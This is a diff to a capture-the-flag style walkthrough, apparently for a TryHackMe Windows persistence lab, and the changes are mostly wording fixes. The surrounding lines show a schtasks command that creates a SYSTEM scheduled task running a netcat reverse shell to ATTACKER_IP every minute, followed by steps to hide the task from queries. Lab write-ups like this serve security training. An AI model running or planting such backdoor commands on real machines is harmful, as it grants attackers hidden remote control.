@@ -6,7 +6,8 @@ Using command: `schtasks`
 - Create a task that runs every minute
 `schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM`
 
-**Note**: keep the name "THM-TaskBackdoor" intact, dont change it else the flag done be retrieved
+**Note**: keep the name "THM-TaskBackdoor" intact, do not change it, else the flag won't be retrieved
+
 The script is scheduled to run with SYSTEM privileges
 
 - Check for the schedule
@@ -25,7 +26,9 @@ The script is scheduled to run with SYSTEM privileges
 ![WLP26](/img/WLP26.png)
 
 - Once deleted, the schedule wont be visible, check by running the command (or check task scheduler):
+
 `schtasks /query /tn thm-taskbackdoor`
+
 ![WLP27](/img/WLP27.png)
 
 - Keep the listener running on the port 4449 and you will get a shell in some time. Retrieve the `flag9.exe`
